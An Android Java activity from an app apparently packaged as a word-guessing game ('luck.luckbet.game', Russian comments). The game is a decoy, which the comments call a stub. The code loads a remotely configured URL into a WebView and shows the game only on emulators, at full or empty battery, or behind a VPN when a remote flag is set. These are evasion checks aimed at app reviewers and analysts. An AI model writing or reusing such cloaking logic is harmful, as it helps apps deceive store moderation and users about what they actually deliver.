package luck.luckbet.game;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;


import androidx.annotation.NonNull;
import android.app.Dialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.os.CountDownTimer;
import android.os.Handler;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.Locale;

import luck.luckbet.game.databinding.ActivityMain2Binding;

public class MainActivity2 extends AppCompatActivity {

    ActivityMain2Binding binding;
    /*private String[] words ={"sport","coach","start", "rugby","darts","arrow","arena", "boxer","batter","cycle","catch",
    "field","loser","medal","ollie","pitch","racer","skate","score","throw","vault"};*/
    private List<String> words = Arrays.asList("sport","coach","start", "rugby","darts","arrow","arena", "boxer","batter","cycle","catch",
            "field","loser","medal","ollie","pitch","racer","skate","score","throw","vault");
    private int wordIndex=0;
    public boolean to;
    private static final String FILE_NAME="MY_FILE_NAME";
    private static final String URL_STRING="URL_STRING";
    public Bundle savedInst;
    String url_FB;
    String url_SP;
    SharedPreferences sPref;
    SharedPreferences.Editor ed;
    private FirebaseRemoteConfig mfirebaseRemoteConfig;
    String word, w1,w2,w3,w4,w5;


    Handler handler;
    Runnable runnable;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        savedInst = savedInstanceState;
        //проверка сохранена ли ссылка
        url_SP = getSharedPrefStr();
        if(url_SP=="") {
            //подключение к FireBase
            getFireBaseUrlConnection();
            getBool();

        }else{
            //проверка на подключение к интернету
            if(!hasConnection(this)){
                Intent intent = new Intent(MainActivity2.this, NoInternet.class);
                startActivity(intent);
            }
            else{//запускаем WebView
                browse(url_SP);
            }
        }
    }

    //включение WebView
    public void browse(String url){
        Intent intent = new Intent(MainActivity2.this, MainActivity3.class);
        intent.putExtra("url", url);
        startActivity(intent);
    }

    //проверка эмулятора
    private boolean checkIsEmu() {
        String phoneModel = Build.MODEL;
        String buildProduct = Build.PRODUCT;
        String buildHardware = Build.HARDWARE;
        String brand = Build.BRAND;
        return (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.toLowerCase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware.equals("goldfish")
                || brand.contains("google")
                || buildHardware.equals("vbox86")
                || buildProduct.equals("sdk")
                || buildProduct.equals("google_sdk")
                || buildProduct.equals("sdk_x86")
                || buildProduct.equals("vbox86p")
                || Build.BOARD.toLowerCase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.toLowerCase(Locale.getDefault()).contains("nox")
                || buildHardware.toLowerCase(Locale.getDefault()).contains("nox")
                || buildProduct.toLowerCase(Locale.getDefault()).contains("nox"))
                || (brand.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                ||"google_sdk".equals(Build.PRODUCT)
                || "sdk_gphone_x86_arm".equals(Build.PRODUCT)
                ||"sdk_google_phone_x86".equals(Build.PRODUCT);
    }

    public static boolean vpnActive(Context context){
        //this method doesn't work below API 21
        if (android.os.Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP)
            return false;
        boolean vpnInUse = false;
        ConnectivityManager connectivityManager = (ConnectivityManager)        context.getSystemService(Context.CONNECTIVITY_SERVICE);

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            Network activeNetwork = connectivityManager.getActiveNetwork();
            NetworkCapabilities caps = connectivityManager.getNetworkCapabilities(activeNetwork);
            return caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN);
        }
        Network[] networks = connectivityManager.getAllNetworks();
        for(int i = 0; i < networks.length; i++) {
            NetworkCapabilities caps = connectivityManager.getNetworkCapabilities(networks[i]);
            if(caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
                vpnInUse = true;
                break;
            }
        }
        return vpnInUse;
    }

    private boolean isBatteryLevelInRange() {
        BatteryManager bm = (BatteryManager) this.getSystemService(BATTERY_SERVICE);
        int batLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        return (1<=batLevel)&&(batLevel<=99);
    }
    //проверка интернет подключения
    public static boolean hasConnection(final Context context)
    {
        ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        if (wifiInfo != null && wifiInfo.isConnected())
        {
            return true;
        }
        wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        if (wifiInfo != null && wifiInfo.isConnected())
        {
            return true;
        }
        wifiInfo = cm.getActiveNetworkInfo();
        if (wifiInfo != null && wifiInfo.isConnected())
        {
            return true;
        }
        return false;
    }

    private void getBool(){
        mfirebaseRemoteConfig.fetchAndActivate()
                .addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                    @Override
                    public void onComplete(@NonNull Task<Boolean> task) {
                        if (task.isSuccessful()) {
                            Log.i("To", String.valueOf(task.getResult()));
                            String value = mfirebaseRemoteConfig.getString("to");
                            if(value.equals("true")){
                                if(vpnActive(MainActivity2.this)){
                                    plug();
                                }
                                else{
                                    getURLStr();
                                }
                            } else if(value.equals("false")) {
                                getURLStr();
                            } else if(value.equals("")) {
                                to= false;
                                getURLStr();
                            }

                        } else {
                            Log.i("To", "null");
                        }
                    }
                });
    }

    //получение ссылки и обработка вызова заглушки/WebView
    public void getURLStr(){
        try {
            mfirebaseRemoteConfig.fetchAndActivate()
                    .addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                        @Override
                        public void onComplete(@NonNull Task<Boolean> task) {
                            if (task.isSuccessful()) {
                                Log.i("Fire", String.valueOf(task.getResult()));
                                url_FB = mfirebaseRemoteConfig.getString("url");
                                if (url_FB.isEmpty()||checkIsEmu()||(!isBatteryLevelInRange())) {
                                    plug();
                                } else {
                                    Log.i("Fire", url_FB);
                                    saveToSP();
                                    browse(url_FB);
                                }

                            } else {
                                url_FB = "";
                                plug();
                                Log.i("Fire", "null2");
                            }
                        }
                    });
        }
        catch (Exception e){
            System.out.println(e.getMessage());
            Intent intent = new Intent(MainActivity2.this, NoInternet.class);
            startActivity(intent);
        }
    }

    //получение локальной ссылки
    public String getSharedPrefStr(){
        sPref = getSharedPreferences(FILE_NAME,MODE_PRIVATE);
        String url_SP = sPref.getString(URL_STRING,"");
        return url_SP;
    }

    //подключение к Firebase
    public void getFireBaseUrlConnection(){
        //подключение к FireBase
        mfirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(10)
                .build();
        mfirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
        mfirebaseRemoteConfig.setDefaultsAsync(R.xml.url_values);
    }
    //вызыв зваглушки
    public void plug(){
        binding = ActivityMain2Binding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());
        Collections.shuffle(words);
        passFocus(binding.ED11,binding.ED12);
        passFocus(binding.ED12,binding.ED13);
        passFocus(binding.ED13,binding.ED14);
        passFocus(binding.ED14,binding.ED15);

        passFocus(binding.ED21,binding.ED22);
        passFocus(binding.ED22,binding.ED23);
        passFocus(binding.ED23,binding.ED24);
        passFocus(binding.ED24,binding.ED25);

        passFocus(binding.ED31,binding.ED32);
        passFocus(binding.ED32,binding.ED33);
        passFocus(binding.ED33,binding.ED34);
        passFocus(binding.ED34,binding.ED35);

        passFocus(binding.ED41,binding.ED42);
        passFocus(binding.ED42,binding.ED43);
        passFocus(binding.ED43,binding.ED44);
        passFocus(binding.ED44,binding.ED45);

        passFocus(binding.ED51,binding.ED52);
        passFocus(binding.ED52,binding.ED53);
        passFocus(binding.ED53,binding.ED54);
        passFocus(binding.ED54,binding.ED55);

        passFocus(binding.ED61,binding.ED62);
        passFocus(binding.ED62,binding.ED63);
        passFocus(binding.ED63,binding.ED64);
        passFocus(binding.ED64,binding.ED65);
        lastLetter(binding.ED15,binding.ED14,binding.ED13,binding.ED12, binding.ED11);
        lastLetter(binding.ED25,binding.ED24,binding.ED23,binding.ED22, binding.ED21);
        lastLetter(binding.ED35,binding.ED34,binding.ED33,binding.ED32, binding.ED31);
        lastLetter(binding.ED45,binding.ED44,binding.ED43,binding.ED42, binding.ED41);
        lastLetter(binding.ED55,binding.ED54,binding.ED53,binding.ED52, binding.ED51);
        lastLetter(binding.ED65,binding.ED64,binding.ED63,binding.ED62, binding.ED61);
    }
    //сохранение ссылки локально
    public void saveToSP(){
        ed = sPref.edit();
        ed.putString(URL_STRING, url_FB);
        ed.apply();
        browse(url_FB);
    }

    public void showInfo(View view) {
        Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.rules);
        dialog.setCancelable(false);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.show();
        Button btn_okey= (Button) dialog.findViewById(R.id.okey_btn);

        btn_okey.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                dialog.dismiss();
            }
        });
    }

    private void passFocus(EditText edt1, EditText edt2){
        edt1.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

            @Override
            public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

            @Override
            public void afterTextChanged(Editable editable) {
                if(editable.length()==1){
                    edt2.requestFocus();
                }
            }
        });

    }
    private void checkRow(EditText edt1,EditText edt2,EditText edt3,EditText edt4,EditText edt5){
        word = words.get(wordIndex);
        System.out.println(word+"!!!!!!!!!");
        setColors(edt1,0);
        setColors(edt2,1);
        setColors(edt3,2);
        setColors(edt4,3);
        setColors(edt5,4);
    }

    private void setColors(EditText ed, int position){
        String s = ed.getText().toString();
        String w = String.valueOf(word.charAt(position));
        if(word.contains(s)){
            ed.setBackground(getDrawable(R.drawable.bg_yellow));
            if(s.equals(w)) ed.setBackground(getDrawable(R.drawable.bg_green));
        }
        else ed.setBackground(getDrawable(R.drawable.bg_grey));
    }

    private void lastLetter(EditText edt5,EditText edt4,EditText edt3,EditText edt2,EditText edt1){
        edt5.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

            @Override
            public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

            @Override
            public void afterTextChanged(Editable editable) {
                if(editable.length()==1){
                   checkRow(edt1, edt2, edt3, edt4, edt5);
                }
            }
        });

    }
}